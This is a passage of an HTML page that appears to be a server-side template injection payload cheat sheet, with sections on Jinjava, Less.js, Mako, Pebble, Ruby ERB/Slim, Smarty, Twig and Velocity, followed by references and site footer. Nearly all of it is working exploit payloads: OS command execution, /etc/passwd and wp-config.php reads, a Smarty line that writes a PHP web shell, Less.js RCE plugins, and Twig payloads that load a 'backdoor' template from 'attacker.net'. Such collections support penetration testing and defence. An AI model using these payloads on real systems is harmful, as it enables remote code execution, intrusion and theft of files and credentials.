+<p>Java-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content).</p>
+</blockquote>
+<h3 id="jinjava-basic-injection">Jinjava - Basic injection</h3>
+<pre><code class="language-python">{{'a'.toUpperCase()}} would result in 'A'
+{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
+</code></pre>
+<p>Jinjava is an open source project developed by Hubspot, available at <a href="https://github.com/HubSpot/jinjava/">https://github.com/HubSpot/jinjava/</a></p>
+<h3 id="jinjava-command-execution">Jinjava - Command execution</h3>
+<p>Fixed by https://github.com/HubSpot/jinjava/pull/230</p>
+<pre><code class="language-python">{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\&quot;new java.lang.String('xxx')\&quot;)}}
+
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;whoami\\\&quot;); x.start()\&quot;)}}
+
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;netstat\\\&quot;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;)}}
+
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\&quot;var x=new java.lang.ProcessBuilder; x.command(\\\&quot;uname\\\&quot;,\\\&quot;-a\\\&quot;); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\&quot;)}}
+</code></pre>
+<hr />
+<h2 id="lessjs">Lessjs</h2>
+<p><a href="https://lesscss.org/">Official website</a></p>
+<blockquote>
+<p>Less (which stands for Leaner Style Sheets) is a backwards-compatible language extension for CSS. This is the official documentation for Less, the language and Less.js, the JavaScript tool that converts your Less styles to CSS styles.</p>
+</blockquote>
+<h3 id="lessjs-ssrf-lfi">Lessjs - SSRF / LFI</h3>
+<pre><code class="language-less">@import (inline) &quot;http://localhost&quot;;
+// or
+@import (inline) &quot;/etc/passwd&quot;;
+</code></pre>
+<h3 id="lessjs-v3-command-execution">Lessjs &lt; v3 - Command Execution</h3>
+<pre><code class="language-less">body {
+  color: `global.process.mainModule.require(&quot;child_process&quot;).execSync(&quot;id&quot;)`;
+}
+</code></pre>
+<h3 id="plugins">Plugins</h3>
+<p>Lessjs plugins can be remotely included and are composed of Javascript which gets executed when the Less is transpiled.</p>
+<pre><code class="language-less">// example local plugin usage
+@plugin &quot;plugin-2.7.js&quot;;
+</code></pre>
+<p>or</p>
+<pre><code class="language-less">// example remote plugin usage
+@plugin &quot;http://example.com/plugin-2.7.js&quot;
+</code></pre>
+<p>version 2 example RCE plugin:</p>
+<pre><code class="language-javascript">functions.add('cmd', function(val) {
+  return `&quot;${global.process.mainModule.require('child_process').execSync(val.value)}&quot;`;
+});
+</code></pre>
+<p>version 3 and above example RCE plugin</p>
+<pre><code class="language-javascript">//Vulnerable plugin (3.13.1)
+registerPlugin({
+    install: function(less, pluginManager, functions) {
+        functions.add('cmd', function(val) {
+            return global.process.mainModule.require('child_process').execSync(val.value).toString();
+        });
+    }
+})
+</code></pre>
+<hr />
+<h2 id="mako">Mako</h2>
+<p><a href="https://www.makotemplates.org/">Official website</a></p>
+<blockquote>
+<p>Mako is a template library written in Python. Conceptually, Mako is an embedded Python (i.e. Python Server Page) language, which refines the familiar ideas of componentized layout and inheritance to produce one of the most straightforward and flexible models available, while also maintaining close ties to Python calling and scoping semantics.</p>
+</blockquote>
+<pre><code class="language-python">&lt;%
+import os
+x=os.popen('id').read()
+%&gt;
+${x}
+</code></pre>
+<h3 id="direct-access-to-os-from-templatenamespace">Direct access to os from TemplateNamespace:</h3>
+<p>Any of these payloads allows direct access to the <code>os</code> module</p>
+<pre><code class="language-python">${self.module.cache.util.os.system(&quot;id&quot;)}
+${self.module.runtime.util.os.system(&quot;id&quot;)}
+${self.template.module.cache.util.os.system(&quot;id&quot;)}
+${self.module.cache.compat.inspect.os.system(&quot;id&quot;)}
+${self.__init__.__globals__['util'].os.system('id')}
+${self.template.module.runtime.util.os.system(&quot;id&quot;)}
+${self.module.filters.compat.inspect.os.system(&quot;id&quot;)}
+${self.module.runtime.compat.inspect.os.system(&quot;id&quot;)}
+${self.module.runtime.exceptions.util.os.system(&quot;id&quot;)}
+${self.template.__init__.__globals__['os'].system('id')}
+${self.module.cache.util.compat.inspect.os.system(&quot;id&quot;)}
+${self.module.runtime.util.compat.inspect.os.system(&quot;id&quot;)}
+${self.template._mmarker.module.cache.util.os.system(&quot;id&quot;)}
+${self.template.module.cache.compat.inspect.os.system(&quot;id&quot;)}
+${self.module.cache.compat.inspect.linecache.os.system(&quot;id&quot;)}
+${self.template._mmarker.module.runtime.util.os.system(&quot;id&quot;)}
+${self.attr._NSAttr__parent.module.cache.util.os.system(&quot;id&quot;)}
+${self.template.module.filters.compat.inspect.os.system(&quot;id&quot;)}
+${self.template.module.runtime.compat.inspect.os.system(&quot;id&quot;)}
+${self.module.filters.compat.inspect.linecache.os.system(&quot;id&quot;)}
+${self.module.runtime.compat.inspect.linecache.os.system(&quot;id&quot;)}
+${self.template.module.runtime.exceptions.util.os.system(&quot;id&quot;)}
+${self.attr._NSAttr__parent.module.runtime.util.os.system(&quot;id&quot;)}
+${self.context._with_template.module.cache.util.os.system(&quot;id&quot;)}
+${self.module.runtime.exceptions.compat.inspect.os.system(&quot;id&quot;)}
+${self.template.module.cache.util.compat.inspect.os.system(&quot;id&quot;)}
+${self.context._with_template.module.runtime.util.os.system(&quot;id&quot;)}
+${self.module.cache.util.compat.inspect.linecache.os.system(&quot;id&quot;)}
+${self.template.module.runtime.util.compat.inspect.os.system(&quot;id&quot;)}
+${self.module.runtime.util.compat.inspect.linecache.os.system(&quot;id&quot;)}
+${self.module.runtime.exceptions.traceback.linecache.os.system(&quot;id&quot;)}
+${self.module.runtime.exceptions.util.compat.inspect.os.system(&quot;id&quot;)}
+${self.template._mmarker.module.cache.compat.inspect.os.system(&quot;id&quot;)}
+${self.template.module.cache.compat.inspect.linecache.os.system(&quot;id&quot;)}
+${self.attr._NSAttr__parent.template.module.cache.util.os.system(&quot;id&quot;)}
+${self.template._mmarker.module.filters.compat.inspect.os.system(&quot;id&quot;)}
+${self.template._mmarker.module.runtime.compat.inspect.os.system(&quot;id&quot;)}
+${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system(&quot;id&quot;)}
+${self.template._mmarker.module.runtime.exceptions.util.os.system(&quot;id&quot;)}
+${self.template.module.filters.compat.inspect.linecache.os.system(&quot;id&quot;)}
+${self.template.module.runtime.compat.inspect.linecache.os.system(&quot;id&quot;)}
+${self.attr._NSAttr__parent.template.module.runtime.util.os.system(&quot;id&quot;)}
+${self.context._with_template._mmarker.module.cache.util.os.system(&quot;id&quot;)}
+${self.template.module.runtime.exceptions.compat.inspect.os.system(&quot;id&quot;)}
+${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system(&quot;id&quot;)}
+${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(&quot;id&quot;)}
+${self.context._with_template.module.cache.compat.inspect.os.system(&quot;id&quot;)}
+${self.module.runtime.exceptions.compat.inspect.linecache.os.system(&quot;id&quot;)}
+${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(&quot;id&quot;)}
+${self.context._with_template._mmarker.module.runtime.util.os.system(&quot;id&quot;)}
+${self.context._with_template.module.filters.compat.inspect.os.system(&quot;id&quot;)}
+${self.context._with_template.module.runtime.compat.inspect.os.system(&quot;id&quot;)}
+${self.context._with_template.module.runtime.exceptions.util.os.system(&quot;id&quot;)}
+${self.template.module.runtime.exceptions.traceback.linecache.os.system(&quot;id&quot;)}
+</code></pre>
+<p>PoC :</p>
+<pre><code class="language-python">&gt;&gt;&gt; print(Template(&quot;${self.module.cache.util.os}&quot;).render())
+&lt;module 'os' from '/usr/local/lib/python3.10/os.py'&gt;
+</code></pre>
+<p>Source <a href="https://twitter.com/podalirius_">@podalirius_</a> : <a href="https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/">https://podalirius.net/en/articles/python-context-free-payloads-in-mako-templates/</a></p>
+<hr />
+<h2 id="pebble">Pebble</h2>
+<p><a href="https://pebbletemplates.io/">Official website</a></p>
+<blockquote>
+<p>Pebble is a Java templating engine inspired by <a href="./#twig">Twig</a> and similar to the Python <a href="./#jinja2">Jinja</a> Template Engine syntax. It features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization.</p>
+</blockquote>
+<h3 id="pebble-basic-injection">Pebble - Basic injection</h3>
+<pre><code class="language-java">{{ someString.toUPPERCASE() }}
+</code></pre>
+<h3 id="pebble-code-execution">Pebble - Code execution</h3>
+<p>Old version of Pebble ( &lt; version 3.0.9): <code>{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}</code>.</p>
+<p>New version of Pebble :</p>
+<pre><code class="language-java">{% set cmd = 'id' %}
+{% set bytes = (1).TYPE
+     .forName('java.lang.Runtime')
+     .methods[6]
+     .invoke(null,null)
+     .exec(cmd)
+     .inputStream
+     .readAllBytes() %}
+{{ (1).TYPE
+     .forName('java.lang.String')
+     .constructors[0]
+     .newInstance(([bytes]).toArray()) }}
+</code></pre>
+<hr />
+<h2 id="ruby">Ruby</h2>
+<h3 id="ruby-basic-injections">Ruby - Basic injections</h3>
+<p>ERB:</p>
+<pre><code class="language-ruby">&lt;%= 7 * 7 %&gt;
+</code></pre>
+<p>Slim:</p>
+<pre><code class="language-ruby">#{ 7 * 7 }
+</code></pre>
+<h3 id="ruby-retrieve-etcpasswd">Ruby - Retrieve /etc/passwd</h3>
+<pre><code class="language-ruby">&lt;%= File.open('/etc/passwd').read %&gt;
+</code></pre>
+<h3 id="ruby-list-files-and-directories">Ruby - List files and directories</h3>
+<pre><code class="language-ruby">&lt;%= Dir.entries('/') %&gt;
+</code></pre>
+<h3 id="ruby-code-execution">Ruby - Code execution</h3>
+<p>Execute code using SSTI for ERB engine.</p>
+<pre><code class="language-ruby">&lt;%= system('cat /etc/passwd') %&gt;
+&lt;%= `ls /` %&gt;
+&lt;%= IO.popen('ls /').readlines()  %&gt;
+&lt;% require 'open3' %&gt;&lt;% @a,@b,@c,@d=Open3.popen3('whoami') %&gt;&lt;%= @b.readline()%&gt;
+&lt;% require 'open4' %&gt;&lt;% @a,@b,@c,@d=Open4.popen4('whoami') %&gt;&lt;%= @c.readline()%&gt;
+</code></pre>
+<p>Execute code using SSTI for Slim engine.</p>
+<pre><code class="language-powershell">#{ %x|env| }
+</code></pre>
+<hr />
+<h2 id="smarty">Smarty</h2>
+<p><a href="https://www.smarty.net/docs/en/">Official website</a></p>
+<blockquote>
+<p>Smarty is a template engine for PHP.</p>
+</blockquote>
+<pre><code class="language-python">{$smarty.version}
+{php}echo `id`;{/php} //deprecated in smarty v3
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET['cmd']); ?&gt;&quot;,self::clearConfig())}
+{system('ls')} // compatible v3
+{system('cat index.php')} // compatible v3
+</code></pre>
+<hr />
+<h2 id="twig">Twig</h2>
+<p><a href="https://twig.symfony.com/">Official website</a></p>
+<blockquote>
+<p>Twig is a modern template engine for PHP.</p>
+</blockquote>
+<h3 id="twig-basic-injection">Twig - Basic injection</h3>
+<pre><code class="language-python">{{7*7}}
+{{7*'7'}} would result in 49
+{{dump(app)}}
+{{dump(_context)}}
+{{app.request.server.all|join(',')}}
+</code></pre>
+<h3 id="twig-template-format">Twig - Template format</h3>
+<pre><code class="language-python">$output = $twig &gt; render (
+  'Dear' . $_GET['custom_greeting'],
+  array(&quot;first_name&quot; =&gt; $user.first_name)
+);
+
+$output = $twig &gt; render (
+  &quot;Dear {first_name}&quot;,
+  array(&quot;first_name&quot; =&gt; $user.first_name)
+);
+</code></pre>
+<h3 id="twig-arbitrary-file-reading">Twig - Arbitrary File Reading</h3>
+<pre><code class="language-python">&quot;{{'/etc/passwd'|file_excerpt(1,30)}}&quot;@
+{{include(&quot;wp-config.php&quot;)}}
+</code></pre>
+<h3 id="twig-code-execution">Twig - Code execution</h3>
+<pre><code class="language-python">{{self}}
+{{_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)}}{{_self.env.loadTemplate(&quot;backdoor&quot;)}}
+{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}{{_self.env.getFilter(&quot;id&quot;)}}
+{{['id']|filter('system')}}
+{{[0]|reduce('system','id')}}
+{{['id']|map('system')|join}}
+{{['id',1]|sort('system')|join}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+</code></pre>
+<p>Example injecting values to avoid using quotes for the filename (specify via OFFSET and LENGTH where the payload FILENAME is)</p>
+<pre><code class="language-python">FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}
+</code></pre>
+<p>Example with an email passing FILTER_VALIDATE_EMAIL PHP.</p>
+<pre><code class="language-powershell">POST /subscribe?0=cat+/etc/passwd HTTP/1.1
+email=&quot;{{app.request.query.filter(0,0,1024,{'options':'system'})}}&quot;@attacker.tld
+</code></pre>
+<hr />
+<h2 id="velocity">Velocity</h2>
+<p><a href="https://velocity.apache.org/engine/1.7/user-guide.html">Official website</a></p>
+<blockquote>
+<p>Velocity is a Java-based template engine. It permits web page designers to reference methods defined in Java code.</p>
+</blockquote>
+<pre><code class="language-python">#set($str=$class.inspect(&quot;java.lang.String&quot;).type)
+#set($chr=$class.inspect(&quot;java.lang.Character&quot;).type)
+#set($ex=$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;whoami&quot;))
+$ex.waitFor()
+#set($out=$ex.getInputStream())
+#foreach($i in [1..$out.available()])
+$str.valueOf($chr.toChars($out.read()))
+#end
+</code></pre>
+<hr />
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/">https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/</a></li>
+<li><a href="https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/">Yahoo! RCE via Spring Engine SSTI</a></li>
+<li><a href="https://www.trustedsec.com/2017/09/rubyerb-template-injection/">Ruby ERB Template injection - TrustedSec</a></li>
+<li><a href="https://gist.github.com/Yas3r/7006ec36ffb987cbfb98">Gist - Server-Side Template Injection - RCE For the Modern WebApp by James Kettle (PortSwigger)</a></li>
+<li><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf">PDF - Server-Side Template Injection: RCE for the modern webapp - @albinowax</a></li>
+<li><a href="https://magicbluech.github.io/2017/12/02/VelocityServlet-Expression-language-Injection/">VelocityServlet Expression Language injection</a></li>
+<li><a href="https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti">Cheatsheet - Flask &amp; Jinja2 SSTI - Sep 3, 2018 • By phosphore</a></li>
+<li><a href="https://medium.com/@ajdumanhug/ritsec-ctf-2018-writeup-web-72a0e5aa01ad">RITSEC CTF 2018 WriteUp (Web) - Aj Dumanhug</a></li>
+<li><a href="https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html?spref=tw">RCE in Hubspot with EL injection in HubL - @fyoorer</a></li>
+<li><a href="https://0day.work/jinja2-template-injection-filter-bypasses/">Jinja2 template injection filter bypasses - @gehaxelt, @0daywork</a></li>
+<li><a href="https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9">Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018</a></li>
+<li><a href="https://www.owasp.org/images/7/7e/Owasp_SSTI_final.pdf">EXPLOITING SERVER SIDE TEMPLATE INJECTION WITH TPLMAP - BY: DIVINE SELORM TSA - 18 AUG 2018</a></li>
+<li><a href="https://research.securitum.com/server-side-template-injection-on-the-example-of-pebble/">Server Side Template Injection – on the example of Pebble - MICHAŁ BENTKOWSKI | September 17, 2019</a></li>
+<li><a href="https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/">Server-Side Template Injection (SSTI) in ASP.NET Razor - Clément Notin - 15 APR 2020</a></li>
+<li><a href="https://portswigger.net/kb/issues/00100f20_expression-language-injection">Expression Language injection - PortSwigger</a></li>
+<li><a href="https://securitylab.github.com/research/bean-validation-RCE">Bean Stalking: Growing Java beans into RCE - July 7, 2020 - Github Security Lab</a></li>
+<li><a href="https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf">Remote Code Execution with EL Injection Vulnerabilities - Asif Durani - 29/01/2019</a></li>
+<li><a href="https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html">Handlebars template injection and RCE in a Shopify app </a></li>
+<li><a href="https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit">Lab: Server-side template injection in an unknown language with a documented exploit</a></li>
+<li><a href="https://www.softwaresecured.com/exploiting-less-js/">Exploiting Less.js to Achieve RCE</a></li>
+<li><a href="https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti">A Pentester's Guide to Server Side Template Injection (SSTI)</a></li>
+<li><a href="https://lifars.com/wp-content/uploads/2021/06/Django-Templates-Server-Side-Template-Injection-v1.0.pdf">Django Templates Server-Side Template Injection</a></li>
+</ul>
+
+  <hr>
+<div class="md-source-file">
+  <small>
+    
+      Last update:
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">August 30, 2022</span>
+      
+    
+  </small>
+</div>
+
+
+
+
+              
+            </article>
+            
+          </div>
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" hidden>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+            Back to top
+          </a>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../Server%20Side%20Request%20Forgery/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Server-Side Request Forgery" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Server-Side Request Forgery
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../Tabnabbing/" class="md-footer__link md-footer__link--next" aria-label="Next: Tabnabbing" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              Tabnabbing
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.top", "navigation.tracking"], "search": "../assets/javascripts/workers/search.ecf98df9.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.2ab50757.min.js"></script>
+      
+    
+  </body>
+</html>
